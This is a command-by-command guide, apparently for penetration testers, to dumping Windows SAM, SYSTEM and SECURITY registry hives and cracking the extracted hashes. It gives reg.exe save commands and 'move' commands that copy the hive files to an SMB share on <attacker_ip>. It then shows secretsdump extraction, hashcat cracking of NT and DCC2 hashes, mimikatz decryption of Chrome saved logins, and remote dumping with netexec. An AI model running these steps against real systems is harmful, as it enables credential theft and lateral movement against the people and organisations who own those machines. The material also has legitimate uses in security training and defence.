
## Overview
With administrative access to a Windows system, attackers can dump the SAM, SYSTEM, and SECURITY registry hives to extract password hashes and sensitive data for offline cracking. This process enables persistent attacks without maintaining an active session.

---

## Registry Hives

| Hive           | Purpose                                                                                      |
|----------------|---------------------------------------------------------------------------------------------|
| HKLM\SAM       | Stores local user account password hashes.                                                   |
| HKLM\SYSTEM    | Contains the system boot key, required to decrypt SAM hashes.                               |
| HKLM\SECURITY  | Holds sensitive LSA info, cached domain credentials (DCC2), cleartext passwords, DPAPI keys.|

---

## Dumping Registry Hives

Use `reg.exe` with admin privileges to save hives:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

---

## Transferring Hive Files

1. **Start SMB Share on Attacker Host:**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```
    
    
2. **Move Files from Target:**
    
    ```cmd
    move sam.save \\<attacker_ip>\CompData
    move system.save \\<attacker_ip>\CompData
    move security.save \\<attacker_ip>\CompData
    ```
    

---

## Dumping Hashes with secretsdump

Use Impacket's `secretsdump.py`:

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

- Dumps local SAM hashes (uid:rid:lmhash:nthash)
- Extracts cached domain logon info and LSA secrets (DPAPI keys, etc.)

---

## Cracking Hashes with Hashcat

1. **Prepare NT hashes in a text file:**
    
    ```
    64f12cddaa88057e06a81b54e73b949b
    31d6cfe0d16ae931b73c59d7e0c089c0
    ...
    ```
    
2. **Crack NT hashes (mode 1000):**
    
    ```bash
    hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
    ```
    

- NT hashes are common on modern Windows; LM hashes may appear on older systems.
- Cracked passwords can be used for lateral movement or privilege escalation.

---

## Cracking DCC2 Hashes

- DCC2 hashes (from HKLM\SECURITY) are cached domain credentials, harder to crack (PBKDF2).
- Hashcat mode: 2100

```
hashcat -m 2100 '$DCC2$10240#administrator#<hash>' /usr/share/wordlists/rockyou.txt
```

- Cracking is much slower than NT hashes.

---

## DPAPI Keys

- DPAPI encrypts sensitive data for Windows and apps (Chrome, Outlook, Credential Manager, etc.).
- Extracted DPAPI keys can decrypt saved credentials using tools like mimikatz.

Example with mimikatz:

```cmd
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## Remote Dumping

- With admin credentials, use `netexec` (or CrackMapExec) to dump LSA secrets and SAM hashes remotely.

**Dump LSA secrets:**

```bash
netexec smb <target_ip> --local-auth -u <user> -p <pass> --lsa
```

**Dump SAM hashes:**

```bash
netexec smb <target_ip> --local-auth -u <user> -p <pass> --sam
```

---

## Notes

- Offline hash extraction and cracking is a standard post-exploitation technique.
- Defenders may have detection and mitigation in place (see MITRE ATT&CK).
- Strong passwords and proper system hardening can make cracking infeasible.

---